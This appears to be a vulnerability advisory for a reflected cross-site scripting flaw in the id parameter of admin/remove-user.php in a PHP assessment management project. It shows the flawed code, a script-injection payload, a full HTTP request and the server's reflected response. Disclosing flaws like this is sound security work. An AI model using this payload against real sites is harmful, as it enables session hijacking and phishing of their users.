## ASSESSMENT MANAGEMENT IN PHP WITH SOURCE CODE admin/remove-user.php Reflected XSS Vulnerability

### I. Vulnerability Impact

An attacker can inject arbitrary HTML/JavaScript through the `id` query parameter, which is reflected into the page's `value` attribute without HTML encoding. A crafted link therefore executes arbitrary script in the victim's browser within the application's origin, enabling session hijacking or phishing.

### II. Source Code Analysis

The vulnerability resides in `admin/remove-user.php`. The `id` parameter is read and passed through `mysqli_real_escape_string()` (which only escapes SQL characters, not HTML) into `$user`:

```php
if (isset($_GET['id'])) {
    $user = mysqli_real_escape_string($conn, $_GET['id']);

    $sql = "SELECT * FROM users WHERE username = '$user'";
    $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));

    while($row = mysqli_fetch_array($result)) {
        $name = $row['name'];
        $sname = $row['surname'];
        $email = $row['email'];
        $user = $row['username'];
        $pass = $row['password'];
    }
}
```

Because the injected username does not exist in the database, the `while` loop never executes and `$user` keeps its original (escaped) value. It is then printed into the `value` attribute without `htmlspecialchars()` or `strip_tags()`:

```php
<input class="form-control" type="text" value="<?php if (isset($_GET['id'])) { print $user; }?>" readonly>
```

`mysqli_real_escape_string()` turns the leading `"` into `\"`, but the backslash has no escaping meaning inside an HTML attribute, so the quote still closes the `value` attribute and the injected `<script>` tag is executed by the browser.

### III. Payload

The core reflected payload is:

```
"><sCrIpT>alert(1)</sCrIpT>
```

HTTP request:

```http
POST /admin/remove-user.php?id="><sCrIpT>alert(1)</sCrIpT> HTTP/1.1
Host: assessment
Content-Length: 13
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0
Origin: http://assessment
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://assessment/admin/remove-user.php?id=zxc@qq.com
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=kl55nmtjo1bgph7dnk408lmcah
Connection: keep-alive

submit=Delete
```

Server response snippet proving the vulnerability:

```html
<input class="form-control" type="text" value="\"><sCrIpT>alert(1)</sCrIpT>" readonly>
```

The `\"` closes the `value` attribute in the HTML context, so `<sCrIpT>alert(1)</sCrIpT>` is parsed as a script element and `alert(1)` executes. The same payload works with a plain GET request.

### IV. Source Download

https://code-projects.org/assessment-management-in-php-with-source-code/

![image-20260824095837624](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260824095837624.png)
